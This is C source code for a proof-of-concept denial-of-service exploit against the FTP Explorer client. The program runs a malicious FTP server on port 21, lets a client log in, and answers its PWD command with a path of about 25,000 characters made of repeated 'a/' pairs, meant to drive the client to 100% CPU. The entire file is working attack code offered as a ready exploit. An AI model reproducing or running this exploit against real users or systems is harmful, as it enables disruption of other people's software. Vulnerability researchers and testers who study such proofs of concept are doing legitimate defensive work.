int main(int argc, char* argv[])
{
	char recvbuff[1024];
	char evilbuff[30000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &wsaData);

	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons( 21 );
	bind(server,(SOCKADDR*)&sin,sizeof(sin));

	printf("[+] FTP Explorer Remote CPU consumption DoS\n");
	printf("[+] Coded and discovered by Marsu <*****@*****.**>\n");
	printf("[*] Listening on port 21 ...\n");
	listen(server,5);
	printf("[*] Waiting for client ...\n");
	client=accept(server,NULL,NULL);
	printf("[+] Client connected\n");
	memcpy(evilbuff,"220 Hello there\r\n\0",18);

	if (send(client,evilbuff,strlen(evilbuff),0)==-1)
	{
		printf("[-] Error in send!\n");
		exit(-1);
	}

	//USER
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
    	memcpy(evilbuff,"331 \r\n\0",7);
	send(client,evilbuff,strlen(evilbuff),0);

	//PASS
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"230 \r\n\0",7);
	send(client,evilbuff,strlen(evilbuff),0);

	//SYST 
	memset(recvbuff,'\0',1024);
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"215 WINDOWS\r\n\0",14);
	send(client,evilbuff,strlen(evilbuff),0);

	//PWD
	int i=5;
	memset(recvbuff,'\0',1024);
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	while (i<25000) {
		memset(evilbuff+i,'a',1);
		i++;
		memset(evilbuff+i,'/',1);
		i++;
	}
	memcpy(evilbuff,"257 \"",5);
	memcpy(evilbuff+25000,"\"\r\n\0",4);
	send(client,evilbuff,strlen(evilbuff),0);

	Sleep(100);
	printf("[+] Must be 100%% CPU consuming\n");
	closesocket(client);
	closesocket(server);
	return 0;

}